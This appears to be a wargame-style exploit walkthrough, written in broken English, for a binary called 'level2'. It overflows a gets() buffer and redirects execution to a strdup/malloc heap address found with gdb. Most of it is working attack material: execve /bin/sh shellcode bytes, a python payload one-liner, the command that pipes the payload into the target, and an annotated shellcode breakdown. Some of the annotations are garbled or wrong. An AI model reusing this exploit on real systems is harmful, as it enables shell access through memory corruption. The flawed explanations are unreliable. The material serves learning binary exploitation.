We see that have 2 general offesets
1. gets <- which we could to overfill
2. strdup <- whoes have offset of malloc

Therefore we could to overfill gets with ouwn
comman "execve/bin/sh" where:
execve - performing system commands
/bin/sh - launching shell

Address of execve/bin/sh:
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
http://shell-storm.org/shellcode/files/shellcode-575.php
to array s[76] + fill with trash 59 symbols yet ("a" * 59)

After it we are searching address where returning value of
malloc. Strdup using malloc and we find it with disas
> disas p - than to see instructions
We are see that 0x08048538 calling function
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
And cheking next instruction 0x0804853d to check the value
and address of malloc where this value placed.
We set breakpoint:
> b *0x0804853d
and run programm
> r
> A
> A
Breakpoint 3, 0x0804853d in p ()
And see value of $eax
(gdb) x $eax
x - use the x command to display the contents of the memory
And we see
0x804a008:      0x00000065
where 0x00000065 is value
0x804a008 is address of malloc
We write this place of malloc like address
0x0804a008
And we use it than to start instead malloc perform
our own shellcode.

python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59+ "\x08\xa0\x04\x08"' > /tmp/breaker

cat /tmp/breaker - | ./level2 

Shellcode:

char sc[] = "\x6a\x0b" // push byte +0xb
"\x58" // pop eax <-- cleaning value of eax
"\x99" // cdq <-- Convert double to quadruple
https://indigobits.com/assembler/12-komandy-rasshireniya.html
"\x52" // push edx <-- send to stack
"\x68\x2f\x2f\x73\x68" // push dword 0x68732f2f <-- push address of bin
"\x68\x2f\x62\x69\x6e" // push dword 0x6e69922f <-- push address of sh
"\x89\xe3" // mov ebx, esp 
esp is register of pointer of stack
ebx is base of memory which temporary keep what did upper
and move it to esp (to stack)
"\x31\xc9" // xor ecx, ecx
ecx is counter of operations (usually in order)
http://natalia.appmat.ru/c&c++/assembler.html

"\xcd\x80"; // int 0x80
is system call of kernel than to say to perform
what is writed in up.
